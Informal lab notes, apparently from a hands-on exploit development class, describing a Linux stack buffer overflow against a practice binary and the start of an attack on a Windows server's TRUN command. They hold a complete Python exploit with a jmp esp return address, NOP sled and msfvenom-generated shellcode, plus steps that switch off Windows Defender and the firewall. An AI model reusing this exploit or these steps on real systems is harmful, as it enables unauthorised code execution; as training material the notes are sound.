
bru


---------------------------------------------------LINUX----------------------------------------------------------------------


PS C:\users\student\downloads> get-content .\func | select -first 1
PS C:\users\student\downloads> scp .\func student@10.50.29.94:


ghidra reverse engineering ...
gets buffer overlfow

use debugger:
gdb ./func
gdb-peda$ (tells us which parts may be vulnerable)
info *functions*
pdisass main (dissasembles functions)
pdisass getuserinput
red sus (vuln)
run

make script 
#!/usr/bin/env python
buffer = "A" * 55
print(buffer)

chmod
student@lin-ops:~$ ./func $(./ohio.py)
student@lin-ops:~$ ./func <<<$(./ohio.py)

https://wiremask.eu/tools/buffer-overflow-pattern-generator/
in script, put the hex in "" (buffer var)
<<<
gdb-peda$ run <<<$(./ohio.py)
eip field: 31634130 (copy)
wiremask (register value)^ 
offset value ***

#!/usr/bin/env python
buffer = "A" * 62
eip = "B" * 4
(print(buffer+eip))

new lin ops
env - gdb ./func
show env (lines and columns set, lets unset them ye)
unset env COLUMNS
unset env LINES
run (enough imput to break)
segmentation fault
info proc map (gdb preda)

identify top and bottom of stack (below heap, and bottom)
(gdb) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
                                    (jump esp)
grab first 4
in script, modify from little endian to big endian
make changes:
#jump esp location
#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop ="\x90" * 15
buf =  b""
buf += b"\xba\xa5\xac\xf3\x07\xd9\xc7\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x0b\x31\x56\x14\x83\xc6\x04\x03\x56"
buf += b"\x10\x47\x59\x99\x0c\xdf\x3b\x0c\x75\xb7\x16\xd2"
buf += b"\xf0\xa0\x01\x3b\x70\x46\xd2\x2b\x59\xf4\xbb\xc5"
buf += b"\x2c\x1b\x69\xf2\x28\xdb\x8e\x02\x40\xb3\xe1\x63"
buf += b"\xc3\x2a\xfe\x34\x48\x25\x1f\x77\xee"
print(buffer+eip+nop+buf)

print (x+x+x+x)
get first and change eip location to it ^^

exit clean gdb (not peda)
student@lin-ops:~$ msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
student@lin-ops:~$ msfdb init

*******msf6 payload(linux/x86/exec) > generate -b '\x00' -f python




final script:

#!/usr/bin/env python

#jump esp location
#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"

buffer = "A" * 62
eip = "\x59\x3b\xde\xf7"
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
nop ="\x90" * 15
buf =  b""
buf += b"\xba\xa5\xac\xf3\x07\xd9\xc7\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x0b\x31\x56\x14\x83\xc6\x04\x03\x56"
buf += b"\x10\x47\x59\x99\x0c\xdf\x3b\x0c\x75\xb7\x16\xd2"
buf += b"\xf0\xa0\x01\x3b\x70\x46\xd2\x2b\x59\xf4\xbb\xc5"
buf += b"\x2c\x1b\x69\xf2\x28\xdb\x8e\x02\x40\xb3\xe1\x63"
buf += b"\xc3\x2a\xfe\x34\x48\x25\x1f\x77\xee"
print(buffer+eip+nop+buf)


---------------------------------------------------WINDOWS----------------------------------------------------------------------


ls
?????? PS C:\users\student\downloads> .\SysinternalsSuite\strings.exe secureserverind
cannot be run in dos mode (windows exe)
get con
PS C:\users\student\downloads> .\secureserverind.exe
windows defender firewall (both red)
windows security: virus and threat protection all settings  turn off

new powershell: netstat -anob(admin)
look for securueserverind (9999 open)

student@lin-ops:~$ nc 10.50.29.94 9999
(nc windows op from linux op using the port open)
flashing icon: (run secureserverind again in powershell)
HELP
TRUN [any value]

ghidra: secureserver, anaylyze, search, TRUN, mem location
iVar1 = _strncmp(pcStack_1c,"TRUN ",5);
5 character limit
look at pcStack_1c 
pcStack_1c = (char *)_malloc(0x1000);     //4096
examine tf outa this shi yu hurd, no cap word ta von jit
strncpy
find function
strcpy (dest, source)
strcpy(local_7dc,param_1);
2008 <-- 3000




































